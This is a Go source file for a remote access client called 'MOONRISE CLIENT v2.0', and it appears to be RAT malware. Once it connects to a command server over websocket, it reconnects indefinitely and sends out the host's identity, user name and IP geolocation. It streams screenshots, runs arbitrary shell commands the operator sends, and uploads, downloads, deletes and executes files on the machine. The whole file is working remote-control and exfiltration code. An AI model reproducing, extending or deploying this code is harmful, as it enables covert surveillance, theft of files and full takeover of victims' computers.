package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image/jpeg"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/kbinani/screenshot"
)

const SERVER_URL = "ws://localhost:5000/socket.io/?EIO=4&transport=websocket"
const MAX_RECONNECT_ATTEMPTS = 999999
const RECONNECT_BASE_DELAY = 1 * time.Second
const RECONNECT_MAX_DELAY = 10 * time.Second
const MAX_FPS = 240
const DEFAULT_FPS = 30

type Client struct {
	conn              *websocket.Conn
	connMutex         sync.Mutex
	clientID          string
	screenshotDelay   time.Duration
	screenshotQuality int
	reconnectAttempts int
	isConnected       bool
	stopScreenshot    chan bool
	hwid              string
	currentFPS        int
	lastFilePath      string
	fileWatchTicker   *time.Ticker
}

type SocketMessage struct {
	Type string      `json:"type"`
	Data interface{} `json:"data"`
}

type SystemInfo struct {
	Hostname  string  `json:"hostname"`
	OS        string  `json:"os"`
	Arch      string  `json:"arch"`
	User      string  `json:"user"`
	Processor string  `json:"processor"`
	Geo       GeoInfo `json:"geo"`
}

type GeoInfo struct {
	Country     string `json:"country"`
	CountryCode string `json:"countryCode"`
	City        string `json:"city"`
	Query       string `json:"query"`
}

func main() {
	client := &Client{
		clientID:          generateClientID(),
		screenshotDelay:   time.Duration(1000/DEFAULT_FPS) * time.Millisecond,
		screenshotQuality: 40,
		reconnectAttempts: 0,
		isConnected:       false,
		stopScreenshot:    make(chan bool, 1),
		hwid:              generateHWID(),
		currentFPS:        DEFAULT_FPS,
		lastFilePath:      "",
	}

	log.Printf("[*] 🚀 MOONRISE CLIENT v2.0 - HWID: %s", client.hwid)
	log.Printf("[*] 🎯 Max FPS: %d | Default: %d FPS", MAX_FPS, DEFAULT_FPS)

	for {
		err := client.connectWithRetry()
		if err != nil {
			log.Printf("[!] ❌ Connection failed: %v", err)
			delay := calculateBackoff(client.reconnectAttempts)
			log.Printf("[*] ⏳ Reconnecting in %v (attempt %d)...", delay, client.reconnectAttempts)
			time.Sleep(delay)
			continue
		}

		client.handleMessages()
		
		// Server died - instant reconnect
		client.isConnected = false
		client.reconnectAttempts++
		
		delay := calculateBackoff(client.reconnectAttempts)
		log.Printf("[*] 🔄 Server disconnected! Reconnecting in %v...", delay)
		time.Sleep(delay)
	}
}

func generateClientID() string {
	hostname, _ := os.Hostname()
	return fmt.Sprintf("%s_%d", hostname, time.Now().Unix()%10000)
}

func generateHWID() string {
	// Generate hardware ID based on system info
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	
	// Combine multiple system identifiers
	hwString := fmt.Sprintf("%s-%s-%s-%s", 
		hostname, 
		currentUser.Username, 
		runtime.GOOS, 
		runtime.GOARCH,
	)
	
	// Hash to create consistent HWID
	hash := sha256.New()
	hash.Write([]byte(hwString))
	return fmt.Sprintf("%x", hash.Sum(nil))[:16]
}

func calculateBackoff(attempts int) time.Duration {
	delay := RECONNECT_BASE_DELAY * time.Duration(1<<uint(attempts))
	if delay > RECONNECT_MAX_DELAY {
		delay = RECONNECT_MAX_DELAY
	}
	return delay
}

func (c *Client) connectWithRetry() error {
	for attempt := 0; attempt < 5; attempt++ {
		err := c.connect()
		if err == nil {
			c.reconnectAttempts = 0
			c.isConnected = true
			log.Printf("[+] ✅ Connected successfully! (attempt %d)", attempt+1)
			return nil
		}
		
		if attempt < 4 {
			delay := time.Duration(attempt+1) * time.Second
			log.Printf("[!] ⚠️ Attempt %d failed: %v. Retry in %v...", attempt+1, err, delay)
			time.Sleep(delay)
		}
	}
	
	return fmt.Errorf("connection failed after 5 attempts")
}

func (c *Client) connect() error {
	dialer := websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
		ReadBufferSize:   16384,
		WriteBufferSize:  16384,
	}
	
	conn, _, err := dialer.Dial(SERVER_URL, nil)
	if err != nil {
		return err
	}

	c.conn = conn
	c.isConnected = true
	log.Printf("[+] 🔗 Connected as %s (HWID: %s)", c.clientID, c.hwid)

	// Send initial handshake
	c.sendMessage("40", nil)
	time.Sleep(100 * time.Millisecond)

	// Get system info
	sysInfo := c.getSystemInfo()
	
	// Register client with HWID and full info
	c.sendSocketIOMessage("register_client", map[string]interface{}{
		"client_id": c.clientID,
		"hwid":      c.hwid,
		"info":      sysInfo,
	})

	log.Printf("[+] 📡 Registered: %s@%s", sysInfo.User, sysInfo.Hostname)
	log.Printf("[+] ⏸️ Screen stream: STOPPED (waiting for start command)")

	// DON'T start screenshot loop automatically - wait for start command
	// go c.screenshotLoop()

	// Start ping/pong to keep connection alive
	go c.keepAlive()

	return nil
}

func (c *Client) sendMessage(msgType string, data interface{}) error {
	c.connMutex.Lock()
	defer c.connMutex.Unlock()
	
	if c.conn == nil {
		return fmt.Errorf("connection is nil")
	}
	
	if data != nil {
		jsonData, _ := json.Marshal(data)
		message := msgType + string(jsonData)
		return c.conn.WriteMessage(websocket.TextMessage, []byte(message))
	}
	return c.conn.WriteMessage(websocket.TextMessage, []byte(msgType))
}

func (c *Client) sendSocketIOMessage(event string, data interface{}) error {
	payload := []interface{}{event, data}
	return c.sendMessage("42", payload)
}

func (c *Client) getSystemInfo() SystemInfo {
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	
	geoInfo := GeoInfo{
		Country:     "Loading...",
		CountryCode: "XX",
		City:        "Loading...",
		Query:       "0.0.0.0",
	}

	// Get geo info with timeout
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("http://ip-api.com/json")
	if err == nil {
		defer resp.Body.Close()
		var geoData map[string]interface{}
		if json.NewDecoder(resp.Body).Decode(&geoData) == nil {
			if country, ok := geoData["country"].(string); ok {
				geoInfo.Country = country
			}
			if countryCode, ok := geoData["countryCode"].(string); ok {
				geoInfo.CountryCode = countryCode
			}
			if city, ok := geoData["city"].(string); ok {
				geoInfo.City = city
			}
			if query, ok := geoData["query"].(string); ok {
				geoInfo.Query = query
			}
			log.Printf("[GEO] 🌍 %s, %s (%s)", geoInfo.City, geoInfo.Country, geoInfo.Query)
		}
	} else {
		log.Printf("[GEO] ⚠️ Failed to fetch geolocation: %v", err)
	}

	cpuInfo := runtime.GOARCH
	if runtime.GOOS == "windows" {
		cmd := exec.Command("wmic", "cpu", "get", "name")
		output, err := cmd.Output()
		if err == nil {
			lines := strings.Split(string(output), "\n")
			if len(lines) > 1 {
				cpuInfo = strings.TrimSpace(lines[1])
			}
		}
	}

	return SystemInfo{
		Hostname:  hostname,
		OS:        fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH),
		Arch:      runtime.GOARCH,
		User:      currentUser.Username,
		Processor: cpuInfo,
		Geo:       geoInfo,
	}
}

func (c *Client) screenshotLoop() {
	log.Printf("[SCREENSHOT] Loop started with delay: %v", c.screenshotDelay)
	
	ticker := time.NewTicker(c.screenshotDelay)
	defer ticker.Stop()

	frameCount := 0
	for {
		select {
		case <-c.stopScreenshot:
			log.Printf("[SCREENSHOT] Loop stopped after %d frames", frameCount)
			return
		case <-ticker.C:
			if !c.isConnected || c.conn == nil {
				log.Printf("[SCREENSHOT] Loop stopped - not connected (frames: %d)", frameCount)
				return
			}

			img, err := c.takeScreenshot()
			if err != nil {
				log.Printf("[!] Screenshot error: %v", err)
				continue
			}

			err = c.sendSocketIOMessage("screenshot_data", map[string]interface{}{
				"client_id": c.clientID,
				"image":     img,
			})
			
			if err != nil {
				log.Printf("[!] Failed to send screenshot: %v", err)
				return
			}
			
			frameCount++
			if frameCount%30 == 0 {
				log.Printf("[SCREENSHOT] 📸 Sent %d frames @ %d FPS", frameCount, c.currentFPS)
			}
		}
	}
}

func (c *Client) keepAlive() {
	ticker := time.NewTicker(25 * time.Second)
	defer ticker.Stop()

	for {
		if !c.isConnected || c.conn == nil {
			return
		}

		select {
		case <-ticker.C:
			err := c.sendMessage("2", nil) // Ping
			if err != nil {
				log.Printf("[!] Ping failed: %v", err)
				return
			}
		}
	}
}

func (c *Client) takeScreenshot() (string, error) {
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return "", err
	}

	// Convert to JPEG and encode to base64 with configurable quality
	var buf bytes.Buffer
	err = jpeg.Encode(&buf, img, &jpeg.Options{Quality: c.screenshotQuality})
	if err != nil {
		return "", err
	}

	return base64.StdEncoding.EncodeToString(buf.Bytes()), nil
}

func (c *Client) handleMessages() {
	defer func() {
		c.isConnected = false
		if c.conn != nil {
			c.conn.Close()
		}
		// Signal screenshot loop to stop
		select {
		case c.stopScreenshot <- true:
		default:
		}
		// Stop file watcher
		if c.fileWatchTicker != nil {
			c.fileWatchTicker.Stop()
		}
		log.Printf("[!] 💀 Connection closed - preparing reconnect...")
	}()

	// Set read deadline
	c.conn.SetReadDeadline(time.Now().Add(120 * time.Second))
	c.conn.SetPongHandler(func(string) error {
		c.conn.SetReadDeadline(time.Now().Add(120 * time.Second))
		return nil
	})

	for {
		_, message, err := c.conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("[!] ⚠️ Server died unexpectedly: %v", err)
			} else {
				log.Printf("[!] 📡 Connection lost: %v", err)
			}
			break
		}

		// Reset read deadline on successful read
		c.conn.SetReadDeadline(time.Now().Add(120 * time.Second))

		msgStr := string(message)
		
		// Handle Socket.IO protocol
		if strings.HasPrefix(msgStr, "42") {
			jsonStr := msgStr[2:]
			var payload []interface{}
			if err := json.Unmarshal([]byte(jsonStr), &payload); err != nil {
				continue
			}

			if len(payload) < 2 {
				continue
			}

			event, ok := payload[0].(string)
			if !ok {
				continue
			}

			data := payload[1]
			c.handleSocketIOEvent(event, data)
		} else if msgStr == "3" {
			// Pong response
			c.sendMessage("2", nil)
		}
	}
}

func (c *Client) handleSocketIOEvent(event string, data interface{}) {
	// Ignore screenshot_data events (we send them, don't need to receive)
	if event == "screenshot_data" {
		return
	}
	
	log.Printf("[EVENT] Received: %s", event)
	
	switch event {
	case "execute_command":
		c.handleExecuteCommand(data)
	case "fs_list_request":
		c.handleFilesList(data)
	case "fs_download_request":
		c.handleFileDownload(data)
	case "fs_upload_file":
		c.handleFileUpload(data)
	case "fs_delete_request":
		c.handleFileDelete(data)
	case "fs_execute_request":
		c.handleFileExecute(data)
	case "update_screen_settings":
		log.Printf("[EVENT] Handling update_screen_settings with data: %+v", data)
		c.handleScreenSettings(data)
	case "client_info_update", "fs_view_data":
		// Ignore these broadcast events
		return
	default:
		log.Printf("[EVENT] Unknown event: %s", event)
	}
}

func (c *Client) handleExecuteCommand(data interface{}) {
	dataMap, ok := data.(map[string]interface{})
	if !ok {
		return
	}

	command, ok := dataMap["command"].(string)
	if !ok {
		return
	}

	output := c.executeCommand(command)
	c.sendSocketIOMessage("result_data", map[string]interface{}{
		"client_id": c.clientID,
		"output":    output,
	})
}

func (c *Client) executeCommand(command string) string {
	var cmd *exec.Cmd
	
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
	}

	return string(output)
}

func (c *Client) handleFilesList(data interface{}) {
	dataMap, ok := data.(map[string]interface{})
	if !ok {
		return
	}

	path, ok := dataMap["path"].(string)
	if !ok {
		path = "."
	}

	if path == "." {
		wd, _ := os.Getwd()
		path = wd
	}

	// Save current path for auto-refresh
	c.lastFilePath = path
	
	// Stop previous file watcher if exists
	if c.fileWatchTicker != nil {
		c.fileWatchTicker.Stop()
		c.fileWatchTicker = nil
	}
	
	// Send initial file list
	c.sendFileList(path)
	
	// Start auto-refresh for this directory (every 3 seconds to avoid spam)
	c.fileWatchTicker = time.NewTicker(3 * time.Second)
	go c.autoRefreshFiles()
	
	log.Printf("[FILES] 📁 Watching: %s (auto-refresh: 3s)", path)
}

func (c *Client) sendFileList(path string) {
	items := []map[string]interface{}{}
	
	entries, err := os.ReadDir(path)
	if err != nil {
		c.sendSocketIOMessage("fs_operation_result", map[string]interface{}{
			"client_id": c.clientID,
			"success":   false,
			"message":   err.Error(),
		})
		return
	}

	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}

		itemType := "file"
		size := info.Size()
		if entry.IsDir() {
			itemType = "dir"
			size = 0
		}

		items = append(items, map[string]interface{}{
			"name": entry.Name(),
			"type": itemType,
			"size": size,
		})
	}

	c.sendSocketIOMessage("fs_view_data", map[string]interface{}{
		"client_id": c.clientID,
		"path":      path,
		"items":     items,
	})
}

func (c *Client) autoRefreshFiles() {
	for range c.fileWatchTicker.C {
		if !c.isConnected || c.lastFilePath == "" {
			if c.fileWatchTicker != nil {
				c.fileWatchTicker.Stop()
			}
			return
		}
		// Add small delay to prevent race condition
		time.Sleep(50 * time.Millisecond)
		c.sendFileList(c.lastFilePath)
	}
}

func (c *Client) handleFileDownload(data interface{}) {
	dataMap, ok := data.(map[string]interface{})
	if !ok {
		return
	}

	filename, ok := dataMap["filename"].(string)
	if !ok {
		return
	}

	fileData, err := os.ReadFile(filename)
	if err != nil {
		c.sendSocketIOMessage("fs_operation_result", map[string]interface{}{
			"client_id": c.clientID,
			"success":   false,
			"message":   err.Error(),
		})
		return
	}

	b64Data := base64.StdEncoding.EncodeToString(fileData)
	c.sendSocketIOMessage("fs_download_ready", map[string]interface{}{
		"client_id": c.clientID,
		"filename":  filepath.Base(filename),
		"data":      b64Data,
	})
}

func (c *Client) handleFileUpload(data interface{}) {
	dataMap, ok := data.(map[string]interface{})
	if !ok {
		return
	}

	filename, ok := dataMap["filename"].(string)
	if !ok {
		return
	}

	b64Data, ok := dataMap["data"].(string)
	if !ok {
		return
	}

	fileData, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		c.sendSocketIOMessage("fs_operation_result", map[string]interface{}{
			"client_id": c.clientID,
			"success":   false,
			"message":   err.Error(),
		})
		return
	}

	err = os.WriteFile(filename, fileData, 0644)
	if err != nil {
		c.sendSocketIOMessage("fs_operation_result", map[string]interface{}{
			"client_id": c.clientID,
			"success":   false,
			"message":   err.Error(),
		})
		return
	}

	c.sendSocketIOMessage("fs_operation_result", map[string]interface{}{
		"client_id": c.clientID,
		"success":   true,
		"message":   "Uploaded",
	})
}

func (c *Client) handleFileDelete(data interface{}) {
	dataMap, ok := data.(map[string]interface{})
	if !ok {
		return
	}

	filename, ok := dataMap["filename"].(string)
	if !ok {
		return
	}

	isDir, _ := dataMap["is_dir"].(bool)

	var err error
	if isDir {
		err = os.RemoveAll(filename)
	} else {
		err = os.Remove(filename)
	}

	if err != nil {
		c.sendSocketIOMessage("fs_operation_result", map[string]interface{}{
			"client_id": c.clientID,
			"success":   false,
			"message":   err.Error(),
		})
		return
	}

	c.sendSocketIOMessage("fs_operation_result", map[string]interface{}{
		"client_id": c.clientID,
		"success":   true,
		"message":   "Deleted",
	})
}

func (c *Client) handleFileExecute(data interface{}) {
	dataMap, ok := data.(map[string]interface{})
	if !ok {
		return
	}

	filename, ok := dataMap["filename"].(string)
	if !ok {
		return
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "start", filename)
	} else {
		cmd = exec.Command("xdg-open", filename)
	}

	err := cmd.Start()
	if err != nil {
		c.sendSocketIOMessage("fs_operation_result", map[string]interface{}{
			"client_id": c.clientID,
			"success":   false,
			"message":   err.Error(),
		})
		return
	}

	c.sendSocketIOMessage("fs_operation_result", map[string]interface{}{
		"client_id": c.clientID,
		"success":   true,
		"message":   fmt.Sprintf("Executed: %s", filepath.Base(filename)),
	})
}

func (c *Client) handleScreenSettings(data interface{}) {
	dataMap, ok := data.(map[string]interface{})
	if !ok {
		return
	}

	// Update quality
	if quality, ok := dataMap["quality"].(float64); ok {
		newQuality := int(quality)
		if newQuality >= 10 && newQuality <= 100 {
			c.screenshotQuality = newQuality
			log.Printf("[SCREEN] 🎨 Quality: %d%%", c.screenshotQuality)
		}
	}

	// Update FPS (convert to delay) - SUPPORT UP TO 240 FPS
	if fps, ok := dataMap["fps"].(float64); ok {
		if fps == 0 {
			// Stop screenshot loop
			log.Printf("[SCREEN] ⏸️ Stream STOPPED by server")
			select {
			case c.stopScreenshot <- true:
			default:
			}
			c.currentFPS = 0
			return
		}
		
		if fps > 0 && fps <= MAX_FPS {
			c.currentFPS = int(fps)
			c.screenshotDelay = time.Duration(1000/fps) * time.Millisecond
			
			log.Printf("[SCREEN] 🚀 Starting stream: %d FPS (delay: %v)", c.currentFPS, c.screenshotDelay)
			
			// Stop old loop if running
			select {
			case c.stopScreenshot <- true:
			default:
			}
			
			// Wait for old loop to stop and drain the channel
			time.Sleep(100 * time.Millisecond)
			
			// Drain any remaining signals from the channel
			select {
			case <-c.stopScreenshot:
				log.Printf("[SCREEN] 🧹 Cleared stop signal from channel")
			default:
			}
			
			// Start new screenshot loop
			go c.screenshotLoop()
			
			log.Printf("[SCREEN] ✅ Stream started: %d FPS @ %d%% quality", c.currentFPS, c.screenshotQuality)
		}
	} else {
		// No FPS in data, just update quality for existing stream
		log.Printf("[SCREEN] ✅ Quality updated: %d%%", c.screenshotQuality)
	}
}